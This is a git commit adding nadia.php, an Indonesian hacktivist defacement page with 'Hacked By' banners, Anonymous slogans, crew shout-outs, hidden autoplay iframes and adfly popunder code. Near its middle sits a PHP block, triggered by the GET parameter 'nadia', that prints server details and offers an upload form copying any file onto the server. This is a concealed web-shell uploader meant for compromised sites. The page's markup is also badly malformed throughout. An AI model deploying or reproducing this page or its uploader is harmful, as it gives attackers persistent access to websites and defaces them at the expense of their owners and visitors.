57061f127d6f5e79296a65b497b2194e14e4bba7
AhmadMaZulPahwan7 <38656579+ahmadmazulpahwan7@users.noreply.github.com>
2020-03-15 06:31:25 +0800

    Add files via upload

---
+++ nadia.php
@@ -0,0 +1,174 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml">	 </script>	 <iframe width="0" height="0" src="https://c.top4top.net/m_1079lfd9d0.mp3" frameborder="0" allowfullscry></iframe> </head> <head> <title>Ms.Nadia by Beauty Cyber Nadia</title> <meta property="og:image" content="https://pustakatips.files.wordpress.com/2013/08/namaku-nadia.jpg">  <Body bgcolor="white">
+<font color="#708090">
+</script>
+</script></span></font></strong></font></head>
+</style></embed></div></body>
+
+<Body bgcolor="white"> <font color="#FF5500"> </script><center> <body onUnload="UserExit()"><script type="text/javascript" src="http://htmlfreecodes.com/codes/rain.js"></script> <center><img style="width:500px;" src="https://pustakatips.files.wordpress.com/2013/08/namaku-nadia.jpg"> </center> <script type="text/javascript"> var adfly_id = 15764901; var popunder_frequency_delay = 0; </script><span id="sec"><div id="foter" class="foter" style="position: absolute; top: 5px; left: -225px; width: 600px; height: 28px; margin: 7px; padding: 20px; font-size: 45px; text-align: center; color: rgb(255, 255, 255); font-family: &quot;trebuchet ms&quot;, Courier new, courier new, sans-serif; transform: rotate(-45deg); transform-origin: 50% 0px 0px; background-color: #FF69B4; border: 1px solid rgb(170, 170, 170); opacity: 2.5; z-index: 1200;"> <font face="courier new"><marquee color="greenblue" behavior="right" scrollamount="6" width="77%" style="width: 77%;"><center>Beauty Cyber Nadia</marquee></font></div></span><br><br><head> <meta charset="utf-8"> <title>Jam Digital</title> <script type="text/javascript"> window.setTimeout("waktu()",1000); function waktu() { var tanggal = new Date(); setTimeout("waktu()",1000); document.getElementById("jam").innerHTML = tanggal.getHours(); document.getElementById("menit").innerHTML = tanggal.getMinutes(); document.getElementById("detik").innerHTML = tanggal.getSeconds(); } </script> </head> <style> #jam-digital{overflow:hidden; width:350px} #hours{float:left; width:100px; height:50px; background-color:#FF69B4; margin-right:25px} #minute{float:left; width:100px; height:50px; background-color:#FF69B4} #second{float:right; width:100px; height:50px; background-color:#FF69B4; margin-left:25px} #jam-digital p{color:#FFF; font-size:36px; text-align:center; margin-top:4px} </style> <body onLoad="waktu()"> <div id="jam-digital"> <div id="hours"><p id="jam"></p></div> <div id="minute"><p id="menit"></p></div> <div id="second"><p id="detik"></p></div> </div> </table> </body> </html>
+<br><br><marquee behavior="scroll" direction="left" scrollamount="100" scrolldelay="40" width="10%" style="width: 100%;"> <font color="HotPink"><h1><b>_____________________________</h1></font></marquee> <center><h1><b><font color="HotPink" face="Papyrus">Hacked By Ms Nadia Cuex ~ { BEAUTY CYBER NADIA }</font></center></h1></b> <br><marquee behavior="scroll" direction="left" scrollamount="100" scrolldelay="40" width="10%" style="width: 100%;"><font color="HotPink"><h1><b>_____________________________</h1></font></marquee><center><h1><b><font color="HotPink" face="Papyrus">Ketika engkau sedih akan masa lalu, risau akan masa depan, janganlah khawatir masih ada Allah yang akan membawa kebahagiaan untukmu....<br><br>Aku mau. dicintai karena ridho Allah dan aku takkan pernah mau dipisahkan denganmu jika kamu masih mencintai ku karena ridho Allah.. kecuali Allah yang memisahkan kita <br></font></center></h1></b>  <font face="Share Tech Mono"size="5"><center><div style="background:#FF69B4;color:#FFF;margin:12px 0;padding:7px 0"><marquee direction="left" scrolldelay="10" truespeed="truespeed" scrollamount="2" onmouseover="this.stop()" onmouseout="this.start()"> Thank You All Team > > > || Attack Of Cyber ||Muslim Cyber Team || Muslim Cyber Indonesia || Jihad Fissabilliah || Hacker Newbie || CR4ZY CYB3R TEAM || S0UL T3AM CYB3R || Cyber Team Indonesia || Cyber Code Indonesia || All FR13NDS CYB3R || DNA Squad Cyber || Indonesian Termux Association || INDONESIA HACKING TEAM || Java Cyber Team || BL4CK J4CK || Semarang Crew || TR1PL3 K1NG || IC.NET || Bali BlackHat || Garuda Security Cyber || Panda7w7 || Virtz Security Team || IndoXploit Hacker Team ||  Cyber Sulawesi Hacker||Aceh Cyber Team|| Outlaws Cyber Team || Indonesian Hacker Family || X-Skat Security Team || 13L4CK M4G1C CYB3R TEAM || LNX.CREW || Beauty Cyber Squad || Indonesian Fighter Cyber || And You  </marquee></div></font></script> <br><font face="Share Tech Mono"size="5"> <center><div style="background:#FF69B4;color:#FFF;margin:12px 0;padding:7px 0"><marquee direction="left" scrolldelay="10" truespeed="truespeed" scrollamount="2" onmouseover="this.stop()" onmouseout="this.start()"> Thank MY FRIENDS > > > || Ms.Nadia Cuex || InMyHeart  || JoyieeeDhell_ || Ms comell || sylvertar || Ms. A || Nisa star7 || Ms. LolyChan || Miss. Well || And You  </marquee></div></font></script><br><br><br></script></span></font></strong></font></head></style></embed></div></body><?php if(isset($_GET["nadia"])) { echo"<font color=#ffffff>".php_uname().""; print "\n";$disable_functions = @ini_get("disable_functions"); echo "<br>DisablePHP=".$disable_functions; print "\n"; echo"<br><form method=post enctype=multipart/form-data>"; echo"<input type=file name=f><input name=k type=submit id=k value=upload><br>"; if($_POST["k"]==upload) { if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){ echo"<b>".$_FILES["f"]["name"]; }else{ echo"<b>yes"; } } }
+?></script></span></font></strong></font></head></style></embed></div></body>
+</SCRIPT>
+<link href="http://fonts.googleapis.com/css?family=Iceland" rel="stylesheet" type="text/css">
+<p align
+<SCRIPT language="JavaScript">
+<center>
+<font color="green">
+<embed name=""
+src=""
+loop="true"
+hidden="true"
+autostart="true">
+</embed>
+<center>
+<script type="text/javascript">
+// Hacked By : S3cvr1Ty H4ck3r
+TypingText = function(element, interval, cursor, finishedCallback) {
+if((typeof document.getElementById == "undefined") || (typeof element.innerHTML == "undefined")) {
+this.running = true;
+return;
+}
+this.element = element;
+this.finishedCallback = (finishedCallback ? finishedCallback : function() { return; });
+this.interval = (typeof interval == "undefined" ? 100 : interval);
+this.origText = this.element.innerHTML;
+this.unparsedOrigText = this.origText;
+this.cursor = (cursor ? cursor : "");
+this.currentText = "";
+this.currentChar = 0;
+this.element.typingText = this;
+if(this.element.id == "") this.element.id = "typingtext" + TypingText.currentIndex++;
+TypingText.all.push(this);
+this.running = false;
+this.inTag = false;
+this.tagBuffer = "";
+this.inHTMLEntity = false;
+this.HTMLEntityBuffer = "";
+}
+TypingText.all = new Array();
+TypingText.currentIndex = 0;
+TypingText.runAll = function() {
+for(var i = 0; i < TypingText.all.length; i++) TypingText.all[i].run();
+}
+TypingText.prototype.run = function() {
+if(this.running) return;
+if(typeof this.origText == "undefined") {
+setTimeout("document.getElementById('" + this.element.id + "').typingText.run()", this.interval);
+return;
+}
+if(this.currentText == "") this.element.innerHTML = "";
+if(this.currentChar < this.origText.length) {
+if(this.origText.charAt(this.currentChar) == "<" && !this.inTag) {
+this.tagBuffer = "<";
+this.inTag = true;
+this.currentChar++;
+this.run();
+return;
+} else if(this.origText.charAt(this.currentChar) == ">" && this.inTag) {
+this.tagBuffer += ">";
+this.inTag = false;
+this.currentText += this.tagBuffer;
+this.currentChar++;
+this.run();
+return;
+} else if(this.inTag) {
+this.tagBuffer += this.origText.charAt(this.currentChar);
+this.currentChar++;
+this.run();
+return;
+} else if(this.origText.charAt(this.currentChar) == "&" && !this.inHTMLEntity) {
+this.HTMLEntityBuffer = "&";
+this.inHTMLEntity = true;
+this.currentChar++;
+this.run();
+return;
+} else if(this.origText.charAt(this.currentChar) == ";" && this.inHTMLEntity) {
+this.HTMLEntityBuffer += ";";
+this.inHTMLEntity = false;
+this.currentText += this.HTMLEntityBuffer;
+this.currentChar++;
+this.run();
+return;
+} else if(this.inHTMLEntity) {
+this.HTMLEntityBuffer += this.origText.charAt(this.currentChar);
+this.currentChar++;
+this.run();
+return;
+} else {
+this.currentText += this.origText.charAt(this.currentChar);
+}
+this.element.innerHTML = this.currentText;
+this.element.innerHTML += (this.currentChar < this.origText.length - 1 ? (typeof this.cursor == "function" ? this.cursor(this.currentText) : this.cursor) : "");
+this.currentChar++;
+setTimeout("document.getElementById('" + this.element.id + "').typingText.run()", this.interval);
+} else {
+this.currentText = "";
+this.currentChar = 0;
+this.running = false;
+this.finishedCallback();
+}
+}
+
+</script><b>
+
+<center>
+<p id="message">
+<font size="5" face="Narkisim" color="HotPink">
+[+] ^^ Message Begins ^^ [+]
+<br>
+<font size="5" face="Narkisim" color="HotPink">
+------------------------------
+<br>
+<font size="5" face="Narkisim" color="HotPink">
+| We are Anonymous | We are Legion | We do not forgive | We do not forget |
+<br>
+<font size="5" face="Narkisim" color="HotPink">
+---------------------------------------------------------------------------
+<br>
+<font size="5" face="Narkisim" color="HotPink">
+| Expect Us! |
+<br>
+<font size="5" face="Narkisim" color="HotPink">
+-------------------
+<br>
+
+<font size="5" face="Narkisim" color="HotPink">We Are Palestine <font color="HotPink">Noob<font color="HotPink"><font color="HotPink"> Hackers
+
+<script type="text/javascript">
+new TypingText(document.getElementById("message"), 55, function(i){ var ar = new Array("|", "|", "|", "|"); return " " + ar[i.length % ar.length]; });
+
+//Type out examples:
+TypingText.runAll();
+
+</script><center>
+<br>
+
+
+<body background="">
+
+
+</script>
+<link href='http://fonts.googleapis.com/css?family=Keania+One' rel='stylesheet' type='text/css'>
+
+<font size="5" face="Narkisim" color="HotPink">~: [+] We Will Come Back [+] :~<br>
+</font><font size="5" face="Keania One" color="HotPink">You<font color="HotPink"> Got <font color="HotPink">Hacked
+
+<style type="text/css">
+.absoluta {position: absolute;
+bottom: 0;
+right: 0;
+background-color: #FF69B4;
+color: #FF69B4;
+}
+</style>
+<link href='http://fonts.googleapis.com/css?family=Iceland' rel='stylesheet' type='text/css'>
+<font face="Iceland" size="5">
+<br><br><font face="Iceland" size="5"><marquee scrollamount="3" scrolldelay="50" width="80%">
+<font color="HotPink" face="Colonna MT" size="5"> Ketika engkau sedih akan masa lalu, risau akan masa depan, janganlah khawatir masih ada Allah yang akan membawa kebahagiaan untukmu....  Aku mau. dicintai karena ridho Allah dan aku takkan pernah mau dipisahkan denganmu jika kamu masih mencintai ku karena ridho Allah.. kecuali Allah yang memisahkan kita
+</font></marquee></font></p>
+<center>
+<iframe width="0%" height="0" scrolling="no" frameborder="no" src="https://www.youtube.com/v/9O72RLP5fF4?rel=0&autoplay=1&showsearch=0></center>
+<body bgcolor="black" oncontextmenu="return false" onkeydown="return false">
+
+
+</div>
+</body>
